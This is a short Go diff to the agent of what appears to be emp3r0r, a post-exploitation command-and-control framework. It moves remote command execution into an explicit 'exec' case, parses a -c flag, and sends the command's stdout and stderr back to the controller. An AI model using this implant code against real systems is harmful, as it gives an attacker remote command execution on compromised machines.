@@ -337,14 +337,21 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 		if downloadedSize < *size {
 			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
 		}
-	default:
+	case "exec":
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
 		if runtime.GOOS == "windows" {
 			if !strings.HasSuffix(cmdSlice[0], ".exe") {
 				cmdSlice[0] += ".exe"
 			}
 		}
-		cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
+		cmdStr := flags.StringP("cmd", "c", "", "Command to execute")
+		flags.Parse(cmdSlice[1:])
+		if *cmdStr == "" {
+			out = "exec: empty command"
+			break
+		}
+		args := util.ParseCmd(*cmdStr)
+		cmd := exec.Command(args[0], args[1:]...)
 		var out_bytes []byte
 		out_buf := bytes.NewBuffer(out_bytes)
 		cmd.Stdout = out_buf
@@ -377,6 +384,8 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 			out = fmt.Sprintf("%s running in background, PID is %d",
 				cmdSlice, cmd.Process.Pid)
 		}
+	default:
 	}
+
 	defer sendResponse(out)
 }
